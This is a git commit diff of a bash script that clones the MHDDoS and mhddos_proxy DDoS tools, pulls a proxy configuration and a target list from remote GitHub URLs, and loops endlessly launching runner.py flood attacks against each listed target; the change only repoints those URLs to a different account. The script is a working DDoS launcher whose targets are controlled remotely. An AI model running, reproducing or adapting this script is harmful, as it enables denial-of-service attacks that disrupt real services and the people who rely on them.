7918da6f93f0ac58c551ec96ec14e516b2771a71
dep-x <102426343+dep-x@users.noreply.github.com>
2022-03-26 21:23:07 +0500

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -12,8 +12,8 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 # for avoid installing wget, otherwise it need to be added in install section
 rm proxies_config.json
-curl -o proxies_config.json https://raw.githubusercontent.com/gruzilkinnn/dev_bash/main/proxies_config.json 
-#wget -N https:/raw.githubusercontent.com/gruzilkinnn/dev_bash/main/proxies_config.json
+curl -o proxies_config.json https://raw.githubusercontent.com/dep-x/bash/main/proxies_config.json 
+#wget -N https:/raw.githubusercontent.com/gruzilkinnn/dep-x/bash/proxies_config.json
 
 git clone https:/github.com/MHProDev/MHDDoS.git
 #change commit SHA and uncomment next 3 lines for revert to certain commit, when something code wrong happened
@@ -32,17 +32,17 @@ while true
 do
    pkill -f start.py; pkill -f runner.py 
    # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.
-   list_size=$(curl -s https:/raw.githubusercontent.com/gruzilkinnn/dev_bash/main/runner_targets | cat | grep "^[^#]" | wc -l)
+   list_size=$(curl -s https:/raw.githubusercontent.com/dep-x/bash/main/runner_targets | cat | grep "^[^#]" | wc -l)
    echo -e "\nNumber of targets in list: " $list_size "\n"
    while [[ $list_size = "0"  ]]
       do
             sleep 5
-            list_size=$(curl -s https:/raw.githubusercontent.com/gruzilkinnn/dev_bash/main/runner_targets | cat | grep "^[^#]" | wc -l)
+            list_size=$(curl -s https:/raw.githubusercontent.com/dep-x/bash/main/runner_targets | cat | grep "^[^#]" | wc -l)
             echo -e "\nNumber of targets in list: " $list_size "\n"
       done
    for (( i=1; i<=list_size; i++ ))
       do
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https:/raw.githubusercontent.com/gruzilkinnn/dev_bash/main/runner_targets  | cat | grep "^[^#]")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https:/raw.githubusercontent.com/dep-x/bash/main/runner_targets  | cat | grep "^[^#]")")
             echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
             python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
       done
